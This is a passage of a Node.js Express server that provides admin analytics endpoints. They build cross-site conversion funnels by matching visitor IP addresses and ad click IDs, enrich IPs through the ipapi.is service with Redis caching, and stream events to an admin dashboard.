// used to populate the site autocomplete inputs on funnel.html.
app.get("/admin/funnel/sites", async (req, res) => {
  try {
    const ids = await redis.zrevrange(KEY_ANALYTICS, 0, ANALYTICS_MAX - 1);
    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hmget(keySession(id), "origin", "url");
    const results = await pipeline.exec();

    const sites = new Set();
    for (const [, fields] of results) {
      if (!fields) continue;
      const [origin, url] = fields;
      if (origin && origin.trim()) sites.add(origin.trim());
      if (url) {
        try { const h = new URL(url).hostname; if (h) sites.add(h); } catch {}
      }
    }
    res.json({ sites: [...sites].sort() });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Match a session to a site string (flexible: origin or URL contains the value)
function sessionMatchesSite(s, site) {
  const q = site.toLowerCase();
  return (s.origin || "").toLowerCase().includes(q) ||
         (s.url    || "").toLowerCase().includes(q);
}

function extractDomain(str) {
  if (!str) return "";
  try {
    const url = /^https?:\/\//.test(str) ? str : "https://" + str;
    return new URL(url).hostname.replace(/^www\./, "");
  } catch (_) { return ""; }
}

// GET /admin/funnel?site1=&site2=&from=&to=&maxHours=&requireOrder=true
// site2 is optional — omit it for multi-destination discovery mode
app.get("/admin/funnel", async (req, res) => {
  try {
    const { site1, site2, from, to, maxHours, requireOrder = "true" } = req.query;
    if (!site1) return res.status(400).json({ error: "site1 required" });

    const { minScore, maxScore } = getScoreRange(from, to);
    const ids = await redis.zrevrangebyscore(KEY_ANALYTICS, maxScore, minScore, "LIMIT", 0, ANALYTICS_MAX);

    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hgetall(keySession(id));
    const rawResults = await pipeline.exec();
    const sessions = rawResults.map(([, s]) => s).filter(s => s && s.id);

    // Always build s1Map
    const s1Map = {};
    for (const s of sessions) {
      const ip = s.ip;
      if (!ip || ip === "unknown") continue;
      if (sessionMatchesSite(s, site1)) { (s1Map[ip] = s1Map[ip] || []).push(s); }
    }
    const s1IPs = new Set(Object.keys(s1Map));

    // ── Multi-destination mode (no site2 specified) ────────────────────
    if (!site2) {
      // For each site1 IP, find all sessions NOT on site1, group by domain
      const otherByIP = {};
      for (const s of sessions) {
        const ip = s.ip;
        if (!ip || !s1IPs.has(ip) || sessionMatchesSite(s, site1)) continue;
        (otherByIP[ip] = otherByIP[ip] || []).push(s);
      }

      const destMap = {}; // domain → { ips: Set, users: [] }
      for (const ip of s1IPs) {
        const sorted1 = (s1Map[ip] || []).slice().sort((a, b) => Number(a.startTime) - Number(b.startTime));
        const first1  = sorted1[0];
        const others  = (otherByIP[ip] || []).slice().sort((a, b) => Number(a.startTime) - Number(b.startTime));
        const seenDomains = new Set();

        for (const s of others) {
          const domain = extractDomain(s.origin || s.url || "");
          if (!domain || seenDomains.has(domain)) continue;
          if (requireOrder === "true" && Number(s.startTime) <= Number(first1.startTime)) continue;
          const ttc = Math.round((Number(s.startTime) - Number(first1.startTime)) / 1000);
          if (maxHours && ttc > Number(maxHours) * 3600) continue;

          seenDomains.add(domain);
          if (!destMap[domain]) destMap[domain] = { ips: new Set(), users: [] };
          if (!destMap[domain].ips.has(ip)) {
            destMap[domain].ips.add(ip);
            destMap[domain].users.push({
              ip,
              site1Session: first1,
              site2Session: s,
              timeToConvert: ttc,
              gclid:    (first1.gclid || s.gclid || "").trim(),
              timezone: first1.timezone || s.timezone || "",
              site2: domain,
            });
          }
        }
      }

      // Build destinations summary (sorted by conversions desc)
      const destinations = Object.entries(destMap)
        .map(([site, { ips, users }]) => {
          const t = users.filter(u => u.timeToConvert > 0).map(u => u.timeToConvert).sort((a, b) => a - b);
          return {
            site,
            converted:        ips.size,
            conversionRate:   (ips.size / s1IPs.size * 100).toFixed(1),
            avgTimeToConvert: t.length ? Math.round(t.reduce((a, b) => a + b, 0) / t.length) : 0,
            withGclid:        users.filter(u => u.gclid).length,
          };
        })
        .sort((a, b) => b.converted - a.converted);

      // Flat user list — one entry per IP (earliest destination wins)
      const seenIPs = new Set();
      const allUsers = [];
      for (const { users } of Object.values(destMap)) {
        for (const u of users) {
          if (!seenIPs.has(u.ip)) { seenIPs.add(u.ip); allUsers.push(u); }
        }
      }
      allUsers.sort((a, b) => Number(b.site1Session.startTime) - Number(a.site1Session.startTime));

      const convertedIPs = seenIPs;
      const nonConverted = [];
      for (const ip of s1IPs) {
        if (convertedIPs.has(ip)) continue;
        const best = s1Map[ip].slice().sort((a, b) => Number(b.startTime) - Number(a.startTime))[0];
        nonConverted.push({ ip, session: best, gclid: (best.gclid || "").trim(), timezone: best.timezone || "", visitedSite2: false });
      }
      nonConverted.sort((a, b) => Number(b.session.startTime) - Number(a.session.startTime));

      const times   = allUsers.filter(u => u.timeToConvert > 0).map(u => u.timeToConvert).sort((a, b) => a - b);
      const avgTime = times.length ? Math.round(times.reduce((a, b) => a + b, 0) / times.length) : 0;
      const medTime = times.length ? times[Math.floor(times.length / 2)] : 0;

      return res.json({
        multiDestination: true,
        site1: { total: sessions.filter(s => sessionMatchesSite(s, site1)).length, uniqueIPs: s1IPs.size },
        site2: { total: 0, uniqueIPs: destinations.length },
        destinations,
        converted:           convertedIPs.size,
        conversionRate:      s1IPs.size > 0 ? ((convertedIPs.size / s1IPs.size) * 100).toFixed(1) : "0.0",
        avgTimeToConvert:    avgTime,
        medianTimeToConvert: medTime,
        withGclid:           allUsers.filter(u => u.gclid).length,
        users:               allUsers,
        nonConverted,
      });
    }

    // ── Single-destination mode (site2 specified) ──────────────────────
    const s2Map = {};
    for (const s of sessions) {
      const ip = s.ip;
      if (!ip || ip === "unknown") continue;
      if (sessionMatchesSite(s, site2)) { (s2Map[ip] = s2Map[ip] || []).push(s); }
    }
    const s2IPs = new Set(Object.keys(s2Map));

    // Build conversion list
    const users = [];
    for (const ip of s1IPs) {
      if (!s2Map[ip]) continue;

      const sorted1 = s1Map[ip].sort((a, b) => Number(a.startTime) - Number(b.startTime));
      const sorted2 = s2Map[ip].sort((a, b) => Number(a.startTime) - Number(b.startTime));
      const first1  = sorted1[0];

      let first2;
      if (requireOrder === "true") {
        first2 = sorted2.find(s => Number(s.startTime) > Number(first1.startTime));
      } else {
        first2 = sorted2[0];
      }
      if (!first2) continue;

      const timeToConvert = Math.round((Number(first2.startTime) - Number(first1.startTime)) / 1000);
      if (maxHours && timeToConvert > Number(maxHours) * 3600) continue;

      users.push({
        ip,
        site1Session:   first1,
        site2Session:   first2,
        timeToConvert,
        gclid:    (first1.gclid || first2.gclid || "").trim(),
        timezone: first1.timezone || first2.timezone || "",
      });
    }

    users.sort((a, b) => Number(b.site1Session.startTime) - Number(a.site1Session.startTime));

    const convertedIPs = new Set(users.map(u => u.ip));
    const nonConverted = [];
    for (const ip of s1IPs) {
      if (convertedIPs.has(ip)) continue;
      const best = s1Map[ip].sort((a, b) => Number(b.startTime) - Number(a.startTime))[0];
      nonConverted.push({
        ip,
        session:  best,
        gclid:    (best.gclid || "").trim(),
        timezone: best.timezone || "",
        visitedSite2: !!s2Map[ip],
      });
    }
    nonConverted.sort((a, b) => Number(b.session.startTime) - Number(a.session.startTime));

    const times   = users.filter(u => u.timeToConvert > 0).map(u => u.timeToConvert).sort((a, b) => a - b);
    const avgTime = times.length ? Math.round(times.reduce((a, b) => a + b, 0) / times.length) : 0;
    const medTime = times.length ? times[Math.floor(times.length / 2)] : 0;

    res.json({
      site1: { total: sessions.filter(s => sessionMatchesSite(s, site1)).length, uniqueIPs: s1IPs.size },
      site2: { total: sessions.filter(s => sessionMatchesSite(s, site2)).length, uniqueIPs: s2IPs.size },
      converted:            users.length,
      conversionRate:       s1IPs.size > 0 ? ((users.length / s1IPs.size) * 100).toFixed(1) : "0.0",
      avgTimeToConvert:     avgTime,
      medianTimeToConvert:  medTime,
      withGclid:            users.filter(u => u.gclid).length,
      users,
      nonConverted,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── end Funnel ───────────────────────────────────────────────────

// ─── IP enrichment ────────────────────────────────────────────────
// Proxies ipapi.is and caches results in Redis for 24 h.
// Set IPAPI_IS_KEY in Render environment variables.
app.get("/admin/ip-info/:ip", async (req, res) => {
  const { ip } = req.params;
  const cacheKey = `ipinfo:${ip}`;
  try {
    const cached = await redis.get(cacheKey);
    if (cached) return res.json(JSON.parse(cached));

    const apiKey = process.env.IPAPI_IS_KEY;
    if (!apiKey) return res.status(503).json({ error: "IPAPI_IS_KEY not set in Render environment" });

    const r = await fetch(`https://api.ipapi.is/?q=${encodeURIComponent(ip)}&key=${apiKey}`);
    if (!r.ok) return res.status(502).json({ error: `ipapi.is returned ${r.status}` });
    const data = await r.json();

    if (data.error) return res.status(400).json({ error: data.error });

    const loc     = data.location || {};
    const asn     = data.asn      || {};
    const company = data.company  || {};

    const is_proxy      = !!data.is_proxy;
    const is_vpn        = !!data.is_vpn;
    const is_tor        = !!data.is_tor;
    const is_datacenter = !!data.is_datacenter;
    const is_mobile     = !!data.is_mobile;

    // Derive a human-readable connection type from ipapi.is fields
    let connection_type;
    if      (is_tor)         connection_type = "Tor";
    else if (is_vpn)         connection_type = "VPN";
    else if (is_proxy)       connection_type = "Proxy";
    else if (is_datacenter)  connection_type = "Datacenter";
    else if (is_mobile)      connection_type = "Mobile";
    else {
      const t = (asn.type || company.type || "").toLowerCase();
      if      (t === "isp")        connection_type = "Residential";
      else if (t === "hosting")    connection_type = "Datacenter";
      else if (t === "education")  connection_type = "Education";
      else if (t === "government") connection_type = "Government";
      else if (t === "business")   connection_type = "Business";
      else if (t === "banking")    connection_type = "Banking";
      else                         connection_type = "Residential"; // safe default for clean IPs
    }

    const result = {
      ip,
      country:         loc.country || asn.country || "",
      country_code:    loc.country || asn.country || "",
      city:            loc.city    || "",
      region:          loc.region  || "",
      isp:             asn.org     || company.name || "",
      org:             asn.org     || company.name || "",
      asn:             asn.asn     ? String(asn.asn) : "",
      connection_type,
      is_proxy,
      is_vpn,
      is_tor,
      is_datacenter,
    };

    // Cache 24 h — IP classifications rarely change
    await redis.setex(cacheKey, 24 * 3600, JSON.stringify(result));
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Flush all cached ipinfo entries so they get re-fetched with the new logic
app.delete("/admin/ip-info-cache", async (req, res) => {
  try {
    const keys = await redis.keys("ipinfo:*");
    if (keys.length) await redis.del(...keys);
    res.json({ deleted: keys.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── end IP enrichment ────────────────────────────────────────────

app.get("/admin/stream", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();
  res.write(": connected\n\n");

  sseClients.add(res);
  const keepalive = setInterval(() => {
    try { res.write(": ping\n\n"); } catch { clearInterval(keepalive); }
  }, 25000);

  req.on("close", () => {
    clearInterval(keepalive);
    sseClients.delete(res);
  });
});

app.get("/admin", (_req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

app.get("/tracker.js", (_req, res) => {
  res.setHeader("Content-Type", "application/javascript");
  res.sendFile(path.join(__dirname, "tracker.js"));
});

// ─── end Analytics ────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  for (const [group, entries] of Object.entries(ORIGIN_GROUPS)) {
    console.log(`  [${group}] ${Object.keys(entries).length} origins`);
  }
  boot().catch((e) => console.error("[boot] fatal:", e));
});
